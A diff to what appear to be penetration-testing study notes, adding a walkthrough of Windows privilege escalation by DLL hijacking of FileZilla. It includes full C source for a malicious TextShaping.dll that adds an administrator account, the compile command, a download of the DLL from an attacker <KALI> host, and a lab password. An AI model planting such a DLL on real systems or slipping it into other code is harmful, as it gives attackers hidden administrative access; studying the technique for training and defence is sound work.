@@ -1198,7 +1198,51 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     `Install-ServiceBinary -Name 'mysql'` //mysql' for service mysql not modifiable by the current user
   - Listing 55 - Analyzing the function ModifiablePath      
 - DLL hijacking
-- Unquoted Service Paths
+  - placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started  
+  - Displaying information about the running service >FileZilla (research shows that this app contain a DLL hijacking vulnerability)  
+    `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname displayname`  
+  - Check if we have permission to write FileZilla  
+    `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
+    `type 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
+  - Goal: identify all DLLs loaded by FileZilla and missing ones. Need administrative privileges to start Process Monitor to collect this data.  
+  - starting Process Monitor as backupadmin > browse C:\tools\Procmon\Procmon64.exe (password:admin123admin123! for backupadmin)  
+  - Filter by process filezilla.exe  
+  - clearing all events  
+  - Fiilter path contains TextShaping.dll (This DDL used to hijack FileZilla)  
+  - create TextShaping.cpp and compile as TextShaping.dll (malicioous code to create user 'dave3' password 'password123!)  
+    ```
+    	#include <stdlib.h>
+	#include <windows.h>
+	
+	BOOL APIENTRY DllMain(
+	HANDLE hModule,// Handle to DLL module
+	DWORD ul_reason_for_call,// Reason for calling function
+	LPVOID lpReserved ) // Reserved
+	{
+	    switch ( ul_reason_for_call )
+	    {
+	        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+	        int i;
+	  	    i = system ("net user dave3 password123! /add");
+	  	    i = system ("net localgroup administrators dave3 /add");
+	        break;
+	        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+	        break;
+	        case DLL_THREAD_DETACH: // A thread exits normally.
+	        break;
+	        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+	        break;
+	    }
+	    return TRUE;
+	}
+    ```
+    `x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`  
+ - on target, download compiled DLL  
+   `iwr -uri http://<KALI>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`  
+ - wait a higher privilege user to run the application and trigger the loading of our malicious DLL  
+ - check new user created  
+   `net user` `net localgroup administrators`  
+- Unquoted Service Paths  
 - Scheduled Tasks
 - Using Exploits   
 ### 18. Linux privilege escalation
